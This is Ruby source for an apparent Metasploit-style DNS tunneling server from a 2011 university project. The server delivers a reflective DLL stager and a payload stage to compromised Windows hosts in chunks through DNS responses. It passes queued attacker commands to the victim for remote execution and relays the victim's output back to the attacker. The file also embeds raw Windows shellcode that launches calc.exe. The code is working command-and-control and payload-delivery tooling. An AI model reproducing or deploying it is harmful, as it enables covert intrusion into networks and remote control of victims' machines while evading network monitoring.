####################################
# Created by Daan Raman
# Universiteit Gent, 2011
####################################


require 'rex/socket'
require 'rex/proto/dns'
require 'thread'
require 'resolv'

module Rex
module Proto
module DNS

  class Server

  	include Rex::Socket
  	include Msf::Handler
  	
  	include Proto
  	
  	#
  	# The default server name that will be returned in the Server attribute of
  	# a response.
  	#
  	DefaultServer = "Rex"
    
  	def initialize(host, port, domain, context = {}, comm = nil)
  		self.listen_host = '0.0.0.0'
  		self.listen_port = 53
  		self.domain = domain
  		self.context     = context
  		self.server_name = DefaultServer
  		self.comm        = comm
  		self.remote_queue = nil
  		
  		#Test payload spawning calc.exe. Only used for testing.
      self.calc_payload = #31
            "\x31\xf6\x56\x64\x8b\x76\x30\x8b\x76\x0c\x8b\x76" +
            "\x1c\x8b\x6e\x08\x8b\x36\x8b\x5d\x3c\x8b\x5c\x1d" +
            "\x78\x01\xeb\x8b\x4b\x18\x67\xe3\xec\x8b\x7b\x20" +
            "\x01\xef\x8b\x7c\x8f\xfc\x01\xef\x31\xc0\x99\x32" +
            "\x17\x66\xc1\xca\x01\xae\x75\xf7\x66\x81\xfa\x10" +
            "\xf5\xe0\xe2\x75\xcc\x8b\x53\x24\x01\xea\x0f\xb7" +
            "\x14\x4a\x8b\x7b\x1c\x01\xef\x03\x2c\x97\x68\x2e" +
            "\x65\x78\x65\x68\x63\x61\x6c\x63\x54\x87\x04\x24" +
            "\x50\xff\xd5\xcc"
  	end
    
    def setStage(stage)
      self.stage = stage
      ::Kernel.puts("Received stage from handler  (#{stage.size()} bytes)")
      self.dll = readDLL()
    end
    
    #Save a reference to the DNS handler
    def setHandler(handler)
      self.handler = handler
    end
    
    def getSock
      return self.sock
    end
    
    # Start the DNS server
  	def start
  	  
  		self.sock = Rex::Socket::Udp.create(
  			'LocalHost' => listen_host,
  			'LocalPort' => listen_port
  		)
  		
  		self.sock.setsockopt(::Socket::SOL_SOCKET, ::Socket::SO_REUSEADDR, 1)
            
  		self.thread = Rex::ThreadFactory.spawn("DNSServerMonitor", false) {
  			monitor_socket
      }
      
      ::Kernel.puts("********************************************")
	    ::Kernel.puts("**Universiteit Gent, 2010 - 2011************")
      ::Kernel.puts("********************************************")
	    ::Kernel.puts("** DNS server started [rex/proto/dns/server]")
	    ::Kernel.puts("********************************************")
  	end
    
    # Stop the DNS server
  	def stop
  		self.thread.kill #stop listening thread
  		self.sock.close rescue nil #stop socket
  	end
  	
    def alias
  		"DNS Server"
  	end
  	
    #
  	# Returns the hardcore alias for the DNS service
  	#
  	def self.hardcore_alias(*args)
  		"#{(args[0] || '')}#{(args[1] || '')}"
  	end
  	
    def monitor_socket
      while true
        
  		  rds = [self.sock]
  			wds = []
  			eds = [self.sock]

  			r,w,e = ::IO.select(rds,wds,eds,1)
        
  			if (r != nil and r[0] == self.sock)
  			  
  				buf,host,port = self.sock.recvfrom(65535)
  				dispatch_request(buf, host, port)
  			end
  		end
  	end
  	
  	# Send a single packet to the specified host
  	def send_packet(pkt, ip, port)
  		self.sock.sendto( pkt, ip, port )
  	end
  	
  	#Dispatch incoming DNS data. This can be a stager request,
  	#or actual communication that needs to be tunneled.
  	def dispatch_request(packet, host, port)
		
  	  #Decode packet as DNS message
  	  request = Resolv::DNS::Message.decode(packet)
      
      request.each_question {|name, typeclass|
				tc_s = typeclass.to_s().gsub(/^Resolv::DNS::Resource::/, "")
		    
		    #::Kernel.puts("Name of query is #{name}")
		    
			  #Detect if we can handle this query
			  if not is_tunneled_query?(name)
			    #::Kernel.puts("Ignoring non-tunneled query - #{name}")
			    break
			  end
			  
			  #Detect the type of query
			  if is_stager_request?(name)
			    #Create new TXT response			    
			    response = Response.new(request, self.domain)
  			  response.setType(TYPE_STAGER)
  			  response.setSeq(getStagerSeq(name))
  			  
  				if((response.getSeq()) * STAGER_CHUNK_SIZE < dll.size())
  				    response.setData(getChunk(dll, STAGER_CHUNK_SIZE, response.getSeq()))
      		    ::Kernel.puts("Sending off #{response.getData().size()} bytes [#{response.getType()}] [#{response.getSeq()}]")
  					else
  					  ::Kernel.puts("Finished sending data [#{response.getType()}]")
  					  
  					  ::Kernel.puts("********************************************")
        	    ::Kernel.puts("*PHASE II: COMMUNICATE WITH REFLECTIVE DLL *")
        	    ::Kernel.puts("********************************************")
  					end
			  end
			  
			  #Detect if request is coming from the stage requesting the payload
			  if is_stage_request_for_payload?(name)
			    #Create new CNAME response
			    response = Response.new(request, self.domain)
  			  response.setType(TYPE_STAGE)
  			  response.setSeq(getStageSeq(name))
			    
			    if((response.getSeq()) * STAGE_CHUNK_SIZE < stage.size())
  				    response.setData(getChunk(stage, STAGE_CHUNK_SIZE, response.getSeq()))
      		    ::Kernel.puts("Sending off #{response.getData().size()} bytes [#{response.getType()}] [#{response.getSeq()}]")
  					else
  					  response.setData(EOF_GET_PAYLOAD)
  					  ::Kernel.puts("Finished sending data [#{response.getType()}]")
  					end
			  end
        
        if is_stage_request_for_session?(name)
          ::Kernel.puts("\n")
          ::Kernel.puts("********************************************")
    	    ::Kernel.puts("********PHASE III: STARTING SESSION ********")
    	    ::Kernel.puts("********************************************")
    	    ::Kernel.puts("\n")
          
          self.handler.initSession(name)    	    
  			  
          response = Response.new(request, self.domain)
  			  response.setType(TYPE_STAGE) #Destination is the stage
  			  response.setSeq(0) #response is 0.0.OK.domain
  			  response.setData(OK_SESSION)
        end
        
        if is_polling_request?(name)
          response = Response.new(request, self.domain)
  			  response.setType(TYPE_STAGE) #Destination is the stage
  			  response.setSeq(99)

  			  if !(self.handler.getRemoteQueue() == nil)
  			    response.setData(self.handler.getRemoteQueue() + "\n") #Newline important to execute command remotely!
  			    self.handler.resetRemoteQueue()
			    else
			      response.setData(POLLING_NO_DATA_ANSWER)
		      end
		      
        end
        
        if is_tunnel_data?(name)
          #We need to decode the data and send it off to the local socket for display to the attacker
          #self.handler.dispatchToConsole("LOCAL DATA NOW")
          #This is a temporal hack and should be rewritten in a future release
          ::Kernel.print("#{getDecodedPayload(name).to_s}")
          
          response = Response.new(request, self.domain)
  			  response.setType(TYPE_STAGE) #Destination is the stage
  			  response.setSeq(0)
  			  
  			  response.setData(TUNNEL_ACK)
        end
        
        
		    send_packet(response.encodeResponse(),  host, port)
			}
  	end
  	
  	def is_tunneled_query?(url)
  	  if not url.to_s.ends_with?(self.domain) 
          return false
      else
          return true
      end
  	end
  	
  	#A stager request looks like <digit>.domainname
  	def is_stager_request?(url)
      if not (numLabels(url) == (1 + numLabels(self.domain)))  
        return false
      end
      
      return true 
  	end
  	
  	#A stage requests us to send over the payload, for example Meterpreter
  	#These queries look like: 0.SEQ_NUM.GETPAYLOAD.<domain>
  	def is_stage_request_for_payload?(url)
  	  if(numLabels(url) == numLabels(self.domain) + 4)
  	    #We have a session number, a sequence number and some data.
  	    if (getLabel(url, 0).to_i == 0 && getLabel(url, 3) == PAYLOAD_REQUEST)
  	      #Correct format for a stage requesting a payload
  	      return true
  	    else
  	      return false
  	    end
  	  else
  	    return false
  	  end
  	end
  	
  	#A stager requests us to start a new session.
  	#This happens after the stage is finished pulling over the payload.
  	#These queries look like this: 0.0.INIT_SESSION.<domain>
  	def is_stage_request_for_session?(url)
  	  if(numLabels(url) == numLabels(self.domain) + 4)
        if (getLabel(url,0).to_i == 0 && getLabel(url,3) == INIT_SESSION)
          return true
        else
          return false
        end
      else
        return false
      end
	  end
	  
	  #Check if a query is a request for polling coming from the client.
	  def is_polling_request?(url)
	    if(numLabels(url) == numLabels(self.domain) + 4)
        if (getLabel(url,0).to_i == 0 && getLabel(url,3) == POLLING_REQUEST)
          return true
        else
          return false
        end
      else
        return false
      end
    end
    
    #Check if a query contains real tunneled data that should be delivered to the local session
    #Currently only support for one single label
    def is_tunnel_data?(url)
        if (getLabel(url, numLabels(url)-numLabels(self.domain)-1) == TUNNEL_DATA)
          return true
        else
          return false
        end
    end
    
    def getDecodedPayload(url)
        domainparts = self.domain.to_s.split(".")
        urlparts =  url.to_s.split(".")

        #-3 for session ID, sequence number and garbage, 
        nrOfPayloadParts = urlparts.length - domainparts.length - 4

        payload = ''
        
        (1..nrOfPayloadParts).each do |i|
          payload = payload + decode_data(urlparts[i+2])
          
        end
        
        return payload

    end
    
    #Currently NetBios decoding
      def decode_data(data)
      	result = ''
      	counter = 0
      	first_nibble = ''
      	second_nibble = ''
      	data.each_byte{|b|

      		if(counter % 2 == 0) then
      			first_nibble = b - 0x41
      		else
      			second_nibble = b - 0x41
      		end

      		counter = counter + 1

      		if(counter >= 1  && counter.modulo(2) ==0) then
      			result = result + ((first_nibble << 4) | second_nibble).chr

      		end

      	}	
      	return result
    end
      
    
    
    #Returns a chunk of the data passed
    def getChunk(data, chunksize, part)
      return data[part * chunksize, chunksize]
    end
    
  	def numLabels(url)
  	  names = url.to_s.split('.')
  	  return names.size()
  	end
  	
  	#Returns the sequence number for packets originating from the stager.
  	#This is the first field of the URL, for example 010.<domain>
  	def getStagerSeq(url)
  	  return getLabel(url,0).to_i
  	end
  	
  	#Returns the sequence number for packets originating from the stage.
  	#This is the second field of the URL, for example 0.<seqnum>.<domain>
  	def getStageSeq(url)
  	  return getLabel(url,1).to_i
  	end
  	
  	def getLabel(url, number)
  	  names = url.to_s.split('.')
  	  return names[number]
  	end
    
    def readDLL()
      # Create a new payload stub
      c = Class.new( ::Msf::Payload )
      c.include( ::Msf::Payload::Stager )
      c.include( ::Msf::Payload::Windows::ReflectiveDllInject )
      
      # Create the migrate stager
      migrate_stager = c.new()
      migrate_stager.datastore['DLL'] = ::File.join( Msf::Config.install_root, "data", "dnstunnel", "dnsTunnelDLL.dll" )

    	return migrate_stager.stage_payload
    end
  	
  protected

  attr_accessor :listen_port, :listen_host, :server_name, :context, :ssl, :comm, :calc_payload
  attr_accessor :sock, :thread, :domain, :stage, :dll, :handler, :remote_queue


  #class
  end

  #modules
  end
  end
  end